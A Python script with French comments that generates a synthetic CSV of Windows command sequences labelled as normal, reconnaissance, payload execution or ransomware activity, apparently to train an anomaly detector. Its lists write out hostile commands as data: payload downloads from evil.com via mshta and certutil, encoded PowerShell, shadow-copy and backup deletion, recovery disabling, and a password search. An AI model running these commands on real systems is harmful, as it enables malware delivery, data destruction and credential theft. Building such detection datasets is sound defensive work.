import pandas as pd
import random
import os

# Définition des "TTPs" (Tactics, Techniques, and Procedures) simulées
# 0: Normal, 1: Reconnaissance, 2: Exécution de payload, 3: Action Ransomware

BENIGN_CMDS = [
    "ipconfig /all", "netstat -an", "arp -a", "tasklist", "svchost.exe",
    "git status", "python app.py", "explorer.exe", "chrome.exe", "code .",
    "ping 8.8.8.8", "nslookup google.com", "dir C:\\Users", "Get-Process",
    "Get-Service", "Update-Module", "Install-Module",
]

RECON_CMDS = [
    "whoami", "systeminfo", "net user", "net group 'Domain Admins'", "hostname",
    "Get-LocalUser", "Get-NetIPAddress", "Resolve-DnsName -Name target.com",
    "nmap -sV localhost", "Test-NetConnection -ComputerName target",
    "findstr /S /I 'password' *.log",
]

EXECUTION_CMDS = [
    "powershell.exe -enc [Base64-Payload]", "mshta.exe http://evil.com/payload.hta",
    "rundll32.exe javascript:...", "Invoke-Expression 'IEX (New-Object Net.WebClient).DownloadString(...)'",
    "certutil.exe -urlcache -f http://evil.com/malware.exe malware.exe",
    "reg.exe add 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
]

RANSOMWARE_CMDS = [
    "vssadmin.exe delete shadows /all /quiet",
    "wbadmin.exe delete catalog -quiet",
    "bcdedit.exe /set {default} recoveryenabled No",
    "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
    "taskkill /f /im sql.exe", "taskkill /f /im backup.exe",
    "cipher.exe /w:C:\\Users\\",
]

def generate_sequence(length=5, label=0):
    """Génère une séquence de commandes."""
    if label == 0:  # Normal
        cmds = BENIGN_CMDS
    elif label == 1:  # Recon
        cmds = BENIGN_CMDS * 2 + RECON_CMDS  # Mix pour le réalisme
    elif label == 2:  # Execution
        cmds = BENIGN_CMDS + EXECUTION_CMDS
    elif label == 3:  # Ransomware
        cmds = BENIGN_CMDS + RECON_CMDS + RANSOMWARE_CMDS
    
    sequence = []
    
    # Assure que la commande malveillante est présente si non-bénin
    if label == 1:
        sequence.append(random.choice(RECON_CMDS))
    elif label == 2:
        sequence.append(random.choice(EXECUTION_CMDS))
    elif label == 3:
        sequence.append(random.choice(RANSOMWARE_CMDS))

    # Complète la séquence
    while len(sequence) < length:
        sequence.append(random.choice(cmds))
    
    random.shuffle(sequence)
    return ";".join(sequence[:length]) # Retourne une string de commandes séparées par ;

def generate_data(num_samples=5000):
    """Génère le dataset complet."""
    data = []
    # 80% de trafic normal
    for _ in range(int(num_samples * 0.8)):
        data.append([generate_sequence(random.randint(3, 8), 0), 0])
    
    # 20% d'anomalies réparties
    for _ in range(int(num_samples * 0.07)):
        data.append([generate_sequence(random.randint(4, 10), 1), 1])
    
    for _ in range(int(num_samples * 0.07)):
        data.append([generate_sequence(random.randint(4, 10), 2), 2])
        
    for _ in range(int(num_samples * 0.06)):
        data.append([generate_sequence(random.randint(5, 12), 3), 3])

    df = pd.DataFrame(data, columns=['sequence', 'label'])
    df = df.sample(frac=1).reset_index(drop=True) # Mélange
    return df

if __name__ == "__main__":
    if not os.path.exists('data'):
        os.makedirs('data')
        
    dataset = generate_data(10000) # 10k échantillons
    output_path = 'data/generated_logs.csv'
    dataset.to_csv(output_path, index=False)
    print(f"Dataset généré et sauvegardé dans {output_path}")
    print(dataset.head())
    print("\nRépartition des labels:")
    print(dataset['label'].value_counts(normalize=True))